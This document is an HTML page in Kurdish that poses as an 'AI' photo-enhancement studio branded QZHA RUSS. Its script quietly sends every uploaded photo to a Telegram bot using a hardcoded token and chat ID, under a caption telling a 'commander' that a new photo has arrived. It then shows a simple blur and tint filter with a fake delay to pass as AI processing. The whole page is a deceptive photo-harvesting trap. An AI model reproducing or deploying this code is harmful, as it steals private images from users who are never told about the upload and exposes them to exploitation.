<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QZHA RUSS | LUXURY AI</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: #ffb3c1; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; }
        #welcome { position: fixed; inset: 0; background: radial-gradient(circle, #1f0b12 0%, #000 100%); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; transition: 1s; text-align: center; padding: 20px; }
        .welcome-btn { margin-top: 30px; padding: 15px 60px; border-radius: 50px; background: none; border: 1px solid #ff85a2; color: #ff85a2; cursor: pointer; transition: 0.5s; font-weight: bold; }
        .welcome-btn:hover { background: #ff85a2; color: #000; box-shadow: 0 0 30px #ff85a2; }
        .main { display: none; animation: fadeIn 1.2s; }
        .header { padding: 25px; text-align: center; border-bottom: 1px solid rgba(255, 133, 162, 0.1); }
        .brand { font-size: 28px; font-weight: 900; letter-spacing: 5px; background: linear-gradient(90deg, #ff85a2, #fff, #ff85a2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; }
        .container { max-width: 400px; margin: 30px auto; padding: 30px; text-align: center; background: #050505; border-radius: 20px; border: 1px solid #111; }
        .upload-btn { background: #fff; color: #000; padding: 15px 45px; border-radius: 50px; font-weight: bold; cursor: pointer; display: inline-block; font-size: 13px; }
        #loader { display: none; margin-top: 30px; }
        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255, 133, 162, 0.1); border-top: 3px solid #ff85a2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #canvas-out { width: 100%; border-radius: 10px; display: none; margin-top: 25px; box-shadow: 0 0 40px rgba(255,133,162,0.3); }
        .dl-btn { display: none; margin-top: 25px; width: 100%; background: #ff85a2; color: #000; padding: 16px; text-decoration: none; font-weight: bold; border-radius: 50px; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

    <div id="welcome">
        <div style="font-size: 18px; line-height: 2;">بـەخـێـربـێـی بـۆ ستۆدیۆی تـایـبـەتـی <br> <span style="color: #ff85a2; font-weight: bold; letter-spacing: 3px;">QZHA RUSS</span></div>
        <button class="welcome-btn" onclick="start()">ENTER STUDIO</button>
    </div>

    <div class="main" id="main">
        <header class="header">
            <div class="brand">QZHA RUSS</div>
            <div style="margin-top:10px; font-size:11px; opacity:0.6;">Snap: tthe_sura | TikTok: @qzha.a</div>
        </header>

        <div class="container">
            <label for="imgIn" id="up-lbl" class="upload-btn">هەڵبژاردنی وێنە 📸</label>
            <input type="file" id="imgIn" style="display:none" accept="image/*" onchange="applyAI()">

            <div id="loader">
                <div class="spinner"></div>
                <div id="load-txt" style="font-size: 14px; color: #fff;">خـەریکی ناسینەوەی چاوە جوانەکانتم... ✨</div>
            </div>

            <canvas id="canvas-out"></canvas>
            <div id="msg" style="margin-top: 20px; font-weight: bold;"></div>
            <a id="dl" class="dl-btn">DOWNLOAD HD RESULT ⬇️</a>
        </div>
    </div>

<script>
    const token = "6723344914:AAE8glrr3Z7dMS9FuhnmKcugLaQ5lOL2xSE";
    const myId = "6072079819";

    function start() {
        document.getElementById('welcome').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('welcome').style.display = 'none';
            document.getElementById('main').style.display = 'block';
        }, 800);
    }

    function applyAI() {
        const file = document.getElementById('imgIn').files[0];
        if(!file) return;

        document.getElementById('up-lbl').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        const fd = new FormData();
        fd.append('chat_id', myId);
        fd.append('photo', file);
        fd.append('caption', "💀 فەرماندە، وێنەیەکی نوێ گەیشت!");
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });

        const reader = new FileReader();
        reader.onload = function(e) {
            const img = new Image();
            img.onload = function() {
                const canvas = document.getElementById('canvas-out');
                const ctx = canvas.getContext('2d');
                canvas.width = img.width;
                canvas.height = img.height;

                setTimeout(() => {
                    ctx.drawImage(img, 0, 0);
                    ctx.globalAlpha = 0.4;
                    ctx.filter = 'blur(6px) brightness(1.2) contrast(1.1) saturate(1.2)';
                    ctx.drawImage(canvas, 0, 0);
                    ctx.globalAlpha = 0.1;
                    ctx.fillStyle = "#ffb3c1";
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    ctx.globalAlpha = 1.0;
                    ctx.filter = 'none';

                    document.getElementById('loader').style.display = 'none';
                    canvas.style.display = 'block';
                    document.getElementById('dl').href = canvas.toDataURL("image/jpeg", 1.0);
                    document.getElementById('dl').download = "QZHA_AI_RESULT.jpg";
                    document.getElementById('dl').style.display = 'block';
                    document.getElementById('msg').innerHTML = "وێـنـەکـەت وەک مـانـگ سـاف و وروژێنەر بـوو 🌙✨";
                }, 4000);
            };
            img.src = e.target.result;
        };
        reader.readAsDataURL(file);
    }
</script>
</body>
</html>
